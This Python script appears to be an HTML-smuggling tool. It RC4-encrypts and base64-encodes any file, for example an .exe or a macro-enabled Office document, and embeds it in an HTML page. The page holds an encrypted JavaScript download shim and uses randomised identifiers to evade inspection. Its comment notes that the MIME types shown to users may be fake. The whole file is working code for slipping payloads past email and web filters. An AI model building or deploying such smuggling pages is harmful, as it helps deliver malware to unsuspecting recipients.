#!/usr/bin/python3

import os
import sys
import base64
import argparse
import random
import string

#=====================================================================================
# These are the MIME types that will be presented to the user (even if some are fake)
mimeTypeDict = {
    ".doc": "application/msword",
    ".docx": "application/msword",
    ".docm": "application/msword",
    ".xls": "application/vnd.ms-excel",
    ".xlsx": "application/vnd.ms-excel",
    ".xlsm": "application/vnd.ms-excel",
    ".xll": "application/vnd.ms-excel",
    ".ppt": "application/vnd.ms-powerpoint",
    ".pps": "application/vnd.ms-powerpoint",
    ".ppsx": "application/vnd.ms-powerpoint",
    ".exe": "application/octet-stream",
    ".js": "application/js",
    ".zip": "application/zip"
}

#=====================================================================================
# Helper functions
#=====================================================================================
def color(string, color=None):
    attr = []
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
        attr.append('1')
        if string.strip().startswith("[!]"):
            attr.append('31')
        elif string.strip().startswith("[+]"):
            attr.append('32')
        elif string.strip().startswith("[?]"):
            attr.append('33')
        elif string.strip().startswith("[*]"):
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def rand():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

def convertFromTemplate(parameters, templateFile):
    try:
        with open(templateFile, 'r') as f:
            template = f.read()
            result = template.format(**parameters)  # Use .format() for {} placeholders
            return result
    except IOError:
        print(color("[!] Could not open or read template file [{}]".format(templateFile), "red"))
        return None

#=====================================================================================
# Class providing RC4 encryption functions
#=====================================================================================
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        if isinstance(key, str):
            key = key.encode()
        for i in range(256):
            self.x = (key[i % len(key)] + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    def binaryEncrypt(self, data):
        output = bytearray(len(data))
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF]
        return bytes(output)

    def stringEncrypt(self, data):
        S = list(range(256))
        j = 0
        out = bytearray()
        for i in range(256):
            j = (j + S[i] + ord(self.key[i % len(self.key)])) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        for char in data:
            if isinstance(char, str):
                char = ord(char)
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(char ^ S[(S[i] + S[j]) % 256])
        return bytes(out)

#=====================================================================================
#                                   MAIN FUNCTION
#=====================================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Creates an HTML file containing an embedded RC4 encrypted file')
    parser.add_argument("-k", "--key", help="Encryption key", dest="key")
    parser.add_argument("-f", "--file", help="Path to the file to embed into HTML", dest="fileName")
    parser.add_argument("-o", "--output", help="Output file name", dest="outFileName")
    parser.add_argument("-m", "--mime", help="Forced mime type for output file", dest="mimeType")
    args = parser.parse_args()

    if args.key and args.fileName and args.outFileName:
        try:
            with open(args.fileName, 'rb') as fileHandle:
                fileBytes = bytearray(fileHandle.read())
                print(color(f"[*] File [{args.fileName}] successfully loaded!"))
        except IOError:
            print(color(f"[!] Could not open or read file [{args.fileName}]", "red"))
            quit()

        rc4Encryptor = RC4(args.key)

        if not args.mimeType:
            fileExtension = os.path.splitext(args.fileName)[1]
            mimeType = mimeTypeDict.get(fileExtension, "application/octet-stream")
        else:
            mimeType = args.mimeType

        payload = base64.b64encode(rc4Encryptor.binaryEncrypt(fileBytes)).decode('utf-8')

        blobShim = (
            '(function(b,fname){if(window.navigator.msSaveOrOpenBlob)'
            'window.navigator.msSaveOrOpenBlob(b,fname);else{var a=window.document.createElement("a");'
            'a.href=window.URL.createObjectURL(b);a.download=fname;'
            'document.body.appendChild(a);a.click();document.body.removeChild(a);}})'
        )

        rc4Function = rand()
        b64AndRC4Function = rand()
        keyFunction = rand()
        varPayload = rand()
        varBlobObjectName = rand()
        varBlobShim = rand()

        blobShimEncrypted = base64.b64encode(rc4Encryptor.stringEncrypt(blobShim)).decode('utf-8')
        blobObjectNameEncrypted = base64.b64encode(rc4Encryptor.stringEncrypt("Blob")).decode('utf-8')

        params = {
            "rc4Function": rc4Function,
            "b64AndRC4Function": b64AndRC4Function,
            "keyFunction": keyFunction,
            "key": args.key,
            "varPayload": varPayload,
            "payload": payload,
            "varBlobObjectName": varBlobObjectName,
            "blobObjectNameEncrypted": blobObjectNameEncrypted,
            "varBlobShim": varBlobShim,
            "blobShimEncrypted": blobShimEncrypted,
            "mimeType": mimeType,
            "fileName": os.path.basename(args.fileName)
        }

        resultHTML = convertFromTemplate(params, "templates/html.tpl")
        if resultHTML:
            outputFile = f"output/{args.outFileName}"
            os.makedirs("output", exist_ok=True)
            with open(outputFile, 'w') as fileHandle:
                fileHandle.write(resultHTML)
            print(color(f"[*] File [{outputFile}] successfully created!", "green"))
        else:
            print(color("[!] Failed to generate HTML file.", "red"))
    else:
        parser.print_help()